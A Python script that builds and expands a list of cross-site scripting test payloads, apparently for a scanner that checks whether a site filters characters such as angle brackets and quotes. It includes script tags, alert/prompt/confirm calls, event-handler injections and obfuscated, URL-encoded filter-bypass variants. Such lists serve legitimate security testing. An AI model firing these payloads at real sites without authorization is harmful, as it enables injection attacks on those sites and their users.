import re
keyword =[]
def keyword_init():
    global keyword
    keyword.clear()
    keyword = ["<591",
               ">591",
               "\"591",
               "\'591",
               "%22591",
               "%27591",  # 以上，测试>"'是否过滤
               "\"'>591",
               "<script>591<script>",
               "%3cscript%3e591%3cscript%3e",
               "prompt(591)",
               "confirm(591)",
               "alert(591)",
               "prompt`591`",
               "window[`ale`+`rt`]`591`",
               "window[`ale`%2b`rt`]`591`",
               "window[`ale`%252b`rt`]`591`",
               "onwheel=591",
               "onclick=591",
               "onmouseover=591",
               "onmouseout=591",
               "<a>591</a>",
               "<input 591>",
               "<a%20onwheel=prompt`591`>591</a>",
               "<a/onwheel=window[`con`+`firm`]`591`>591</a>",
               "<a/onwheel=window[`con`%2b`firm`]`591`>591</a>",
               "<a/onwheel=window[`con`%252b`firm`]`591`>591</a>",
               "'\"><a/onwheel=window['al'%2b'ert']()>591",
               "\"'\"%20accesskey=\"m\"onclick=\"prompt(591)%20",
               "';prompt(591);var1='1"
               ]
    # [print(e) for e in keyword]

def keyword_expand(key):
    global keyword
    while key =="<>":
        keyword_2 = []
        for w1 in keyword:
            if re.search("<|>", w1):
                w2 = ""
                if re.search("<", w1):
                    w2 = re.sub("<", "%3c", w1)
                    if re.search(">", w2):
                        w2 = re.sub(">", "%3e", w2)
                    keyword_2.append(w2)
                else:
                    if re.search(">", w1):
                        w2 = re.sub(">", "%3e", w1)
                    keyword_2.append(w2)
        keyword += keyword_2
        break
    while key =="\"'>":
        newlist=["\"'>"+i for i in keyword]
        keyword=newlist
        # [print(e) for e in keyword]
        break

    # def keyword_add_clog(self):
# if __name__ == '__main__':
   # keyword_expand("\"'>")